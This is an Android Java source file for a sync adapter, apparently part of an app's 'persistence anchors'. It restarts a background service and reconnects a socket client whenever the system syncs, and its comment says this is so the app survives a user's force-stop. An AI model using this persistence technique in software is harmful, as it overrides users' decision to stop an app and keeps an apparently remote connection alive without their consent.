package com.fason.app.persistence.anchors;

import android.accounts.Account;
import android.content.AbstractThreadedSyncAdapter;
import android.content.ContentProviderClient;
import android.content.Context;
import android.content.SyncResult;
import android.os.Bundle;
import android.util.Log;
import com.fason.app.core.network.SocketClient;
import com.fason.app.service.MainService;

/**
 * SyncAdapter — triggered by system account sync.
 * Survives force-stop because the system owns the sync schedule.
 */
public class FasonSyncAdapter extends AbstractThreadedSyncAdapter {
    private static final String TAG = "FasonSyncAdapter";

    public FasonSyncAdapter(Context context, boolean autoInitialize) {
        super(context, autoInitialize);
    }

    public FasonSyncAdapter(Context context, boolean autoInitialize, boolean allowParallelSyncs) {
        super(context, autoInitialize, allowParallelSyncs);
    }

    @Override
    public void onPerformSync(
            Account account,
            Bundle extras,
            String authority,
            ContentProviderClient provider,
            SyncResult syncResult) {
        Log.i(TAG, "System-triggered sync — checking service health");

        // Ensure MainService is running
        try {
            if (MainService.getInstance() == null) {
                Context ctx = getContext();
                android.content.Intent intent = new android.content.Intent(ctx, MainService.class);
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    ctx.startForegroundService(intent);
                } else {
                    ctx.startService(intent);
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "Service restart from sync failed", e);
        }

        // Ensure socket is connected
        try {
            SocketClient client = SocketClient.getInstance();
            if (client != null && !client.isConnected()) {
                client.reconnect();
            }
        } catch (Exception e) {
            Log.w(TAG, "Socket reconnect from sync failed", e);
        }

        // Report success to keep sync interval stable
        syncResult.stats.numIoExceptions = 0;
    }
}
